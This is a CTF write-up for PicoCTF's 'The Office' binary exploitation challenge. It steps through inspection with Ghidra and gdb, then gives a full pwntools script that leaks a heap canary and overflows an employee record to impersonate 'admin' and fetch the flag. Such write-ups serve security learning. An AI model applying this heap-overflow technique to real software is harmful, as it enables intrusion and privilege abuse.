# PicoCTF-TheOffice
![gambar](https://github.com/user-attachments/assets/1ee6224e-9c36-454d-a2b6-ece9a1c1beaa)
 * **Category: Binary Exploitation**
 * **Difficulty:HARD**
# Inspections
From the challenge, there is a link that provides a file with the name  `The_office` Knowing this, I tried to download the file and then I inspected the file by looking at the file type. The file was found to be an ELF file.
![filing](https://github.com/user-attachments/assets/e70f5c0a-595e-4390-a85b-60ffe4f8842b)
From this, I tried to change the file execution policy by using chmod to look further into the file using gdb and ghidra. 
 ## Ghidra Inspections
 When decompiling using Ghidra, I saw that there
 were several functions in the file that received continuous input and stored it in the memory heap. 
 ![ghidra](https://github.com/user-attachments/assets/51881fe9-36f4-478a-adf4-e9a9e04e50d8)
knowing this, i tried to use gdb for more deep inspections
## gdb peda inspections
Using gdb peda, I tried to see the security of the file first, what are the active security features of the file, seeing this I tried to do a stack overflow by entering several payloads.
![checksec](https://github.com/user-attachments/assets/89fc34e5-aa71-4a78-bd42-3de40f9150b1)

when done the overflowing i get this following :
![ingdbchoose4](https://github.com/user-attachments/assets/b7a96251-4222-4fea-9adf-a4efd82f761b)
From this, it can be seen that the string `admin`. Knowing this, I tried to see what functions are available in the program and obtained the following results: 
![checkfunctions](https://github.com/user-attachments/assets/7235bbd0-b8a3-423d-9f1f-13b7c89c277b)
After trying this, I tried to make a script that would do the overflow and get a flag from the file, where for the source code I used the following source code:
```python
#!/usr/bin/env python3

from pwn import context, log, p32, process, remote, sys

context.binary = 'the_office'
elf = context.binary


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], int(sys.argv[2])
    return remote(host, port)


def add_employee(p, name=b'a', email=None, salary=b'1', phone=b'b'):
    p.sendlineafter(b'token', b'1')
    p.sendlineafter(b'Name: ', name)

    if email:
        p.sendlineafter(b'Email (y/n)? ', b'y')
        p.sendlineafter(b'Email address: ', email)
    else:
        p.sendlineafter(b'Email (y/n)? ', b'n')

    p.sendlineafter(b'Salary: ', salary)
    p.sendlineafter(b'Phone #: ', phone)
    p.sendlineafter(b'Bldg (y/n)? ', b'n')


def main():
    p = get_process()

    add_employee(p, email=b'A' * 24)

    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')

    add_employee(p)
    add_employee(p)

    p.sendlineafter(b'token', b'3')
    p.recvuntil(b'Bldg #: ')
    p.recvuntil(b'Bldg #: ')

    canary = int(p.recvline().strip().decode())
    log.info(f'Leaked heap canary: {hex(canary)}')

    p.sendlineafter(b'token', b'2')
    p.sendlineafter(b'Employee #?\n', b'0')

    add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin')  

    p.sendlineafter(b'token', b'4')
    p.sendlineafter(b'Employee #?\n', b'1')

    log.success(f'Flag: {p.recvline().decode()}')
    p.close()


if __name__ == '__main__':
    main()
```
for more detail you can check this [pathfile](https://github.com/ZahidWazifa/PicoCTF-TheOffice/blob/master/script2.py)
after run it  i get the flag via the virtual servel that gived by the lab
![gettheflag](https://github.com/user-attachments/assets/72504726-53b7-4c31-b5d6-f738be7e257c)

